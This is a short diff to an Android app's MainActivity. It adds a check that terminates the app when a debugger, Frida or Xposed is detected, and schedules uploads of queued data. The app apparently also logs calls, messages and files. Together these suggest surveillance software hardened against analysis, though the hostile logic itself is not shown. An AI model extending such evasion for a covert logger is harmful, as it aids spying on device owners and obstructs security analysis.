@@ -22,6 +22,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.example.logcat.manager.AntiTamperGuard;
+import com.example.logcat.queue.UploadQueueWorker;
 import com.example.logcat.service.CallingLogger;
 import com.example.logcat.service.FileSystemLogger;
 import com.example.logcat.service.MessageLogger;
@@ -41,7 +43,13 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // 권한 요청 시작
+
+        // 디버거/Frida/Xposed 감지 시 즉시 종료 (릴리즈 빌드에서 활성화)
+        AntiTamperGuard.checkAndTerminateIfCompromised(getApplicationInfo());
+
+        // 네트워크 복구 시 오프라인 큐 플러시 예약
+        UploadQueueWorker.scheduleFlush(this);
+
         checkAndRequestPermissions();
     }
 
